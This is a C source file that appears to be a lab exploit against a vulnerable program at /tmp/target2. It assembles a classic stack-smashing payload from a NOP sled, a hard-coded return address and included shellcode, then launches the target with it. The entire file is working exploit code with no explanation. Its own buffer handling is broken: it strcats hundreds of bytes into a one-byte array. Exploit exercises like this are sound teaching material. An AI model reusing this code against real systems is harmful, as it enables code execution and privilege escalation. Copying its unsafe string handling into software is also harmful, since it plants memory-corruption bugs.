#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

#define NOP "\x90"

// address that points  where the shellcode should begin inside the filled buffer
#define SH_AD "\x08\xfd\xff\xbf"

char overflower[] = "";


int main(void)
{
  char *args[3];
  char *env[1];

  int i;

  // NOPs for padding
  for(i=0; i<124; i++) {
    strcat(overflower, NOP);
  }

  // address that points to the shellcode  
  strcat(overflower, SH_AD);

  // shellcode
  strcat(overflower, shellcode);
  
  // other NOPs to fill the buffer
  for(i=0; i<67; i++) {
    strcat(overflower, NOP);  
  }

  args[0] = TARGET; args[1] = overflower; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

